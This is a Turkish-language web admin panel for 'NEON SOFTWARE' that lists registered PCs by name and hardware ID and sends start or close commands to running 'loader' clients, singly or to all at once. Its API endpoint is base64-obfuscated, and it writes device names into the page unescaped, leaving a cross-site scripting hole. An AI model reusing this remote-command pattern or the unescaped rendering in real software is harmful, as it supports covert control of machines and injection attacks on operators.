<!-- NEON SOFTWARE RELEASE [v1.3] -->
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>NEON SOFTWARE - Yönetim Paneli</title>
    <style>
        * { box-sizing: border-box; }
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 40px; display: flex; justify-content: center; }
        .panel-container { background: #0f172a; border: 1px solid #1e293b; border-radius: 16px; width: 1050px; padding: 30px; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5); }
        .header-flex { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e293b; padding-bottom: 20px; margin-bottom: 25px; }
        h2 { color: #f43f5e; margin: 0; font-size: 22px; font-family: monospace; }
        .stats-badge { background: #1e293b; color: #38bdf8; padding: 6px 14px; border-radius: 20px; font-size: 13px; font-family: monospace; border: 1px solid #334155; }
        .stats-badge span { color: #22c55e; font-weight: bold; }
        .btn-group { margin-bottom: 25px; display: flex; gap: 12px; }
        button { padding: 11px 20px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; color: white; font-size: 13px; transition: 0.2s; }
        button:hover { opacity: 0.85; transform: translateY(-1px); }
        .btn-green { background-color: #16a34a; }
        .btn-red { background-color: #dc2626; }
        .btn-blue { background-color: #2563eb; }
        .table-wrapper { overflow-x: auto; border-radius: 10px; border: 1px solid #1e293b; }
        table { width: 100%; border-collapse: collapse; text-align: left; background: #0b0f19; }
        th, td { padding: 14px 18px; font-size: 13px; border-bottom: 1px solid #1e293b; }
        th { background: #111827; color: #38bdf8; font-family: monospace; text-transform: uppercase; font-size: 11px; }
        .status-pill { display: inline-flex; align-items: center; gap: 6px; padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; font-family: monospace; }
        .pill-online { background: rgba(34, 197, 94, 0.15); color: #22c55e; border: 1px solid rgba(34, 197, 94, 0.3); }
        .pill-offline { background: rgba(239, 68, 68, 0.15); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
        .empty-row { text-align: center; color: #64748b; padding: 30px; font-style: italic; }
    </style>
</head>
<body>

<div class="panel-container">
    <div class="header-flex">
        <h2>NEON SOFTWARE // PANEL</h2>
        <div class="stats-badge">Aktif: <span id="activeCount">0</span> | Toplam: <span id="totalCount">0</span></div>
    </div>

    <div class="btn-group">
        <button class="btn-green" onclick="sendGlobalCommand('start')">Tüm PC'lerde Sistemi Aç</button>
        <button class="btn-red" onclick="sendGlobalCommand('close')">Tüm PC'lerde Loader'ı Kapat</button>
        <button class="btn-blue" onclick="alert('Güncelleme paketi hazır!')">Tümüne Güncelleme Getir (.exe)</button>
    </div>

    <div class="table-wrapper">
        <table>
            <thead>
                <tr>
                    <th>Bilgisayar Adı (PC)</th>
                    <th>HWID Kimliği</th>
                    <th>Sunucu Durumu</th>
                    <th>İşlem / Aksiyon</th>
                </tr>
            </thead>
            <tbody id="deviceTableBody">
                <tr><td colspan="4" class="empty-row">Veriler yükleniyor...</td></tr>
            </tbody>
        </table>
    </div>
</div>

<script>
    function getApiUrl(actionParam) {
        let endpoint = atob('YXBpLnBocA=='); // api.php (Base64)
        return `${endpoint}?${actionParam}`;
    }

    function fetchDevices() {
        fetch(getApiUrl('action=get_devices'))
            .then(res => res.json())
            .then(data => {
                if (data.status === 'success') {
                    document.getElementById('activeCount').innerText = data.active_count;
                    document.getElementById('totalCount').innerText = data.total_count;
                    
                    let tbody = document.getElementById('deviceTableBody');
                    tbody.innerHTML = '';

                    if (data.devices.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="4" class="empty-row">Kayıtlı cihaz yok.</td></tr>';
                        return;
                    }

                    data.devices.forEach(dev => {
                        let statusHtml = dev.is_online 
                            ? `<span class="status-pill pill-online">● ÇEVRİM İÇİ</span>` 
                            : `<span class="status-pill pill-offline">○ ÇEVRİM DIŞI</span>`;

                        tbody.innerHTML += `<tr>
                            <td><strong>${dev.pc_name}</strong></td>
                            <td style="font-family: monospace; color: #94a3b8;">${dev.hwid}</td>
                            <td>${statusHtml}</td>
                            <td><button class="btn-red" style="padding: 5px 10px; font-size: 11px;" onclick="sendTargetCommand('${dev.hwid}', 'close')">Kapat</button></td>
                        </tr>`;
                    });
                }
            });
    }

    function sendGlobalCommand(cmd) {
        fetch(getApiUrl(`action=send_command&hwid=all&cmd=${cmd}`))
            .then(() => alert("Toplu komut gönderildi!"));
    }

    function sendTargetCommand(hwid, cmd) {
        fetch(getApiUrl(`action=send_command&hwid=${hwid}&cmd=${cmd}`))
            .then(() => alert("Komut cihaza iletildi!"));
    }

    setInterval(fetchDevices, 3000);
    fetchDevices();
</script>

</body>
</html>
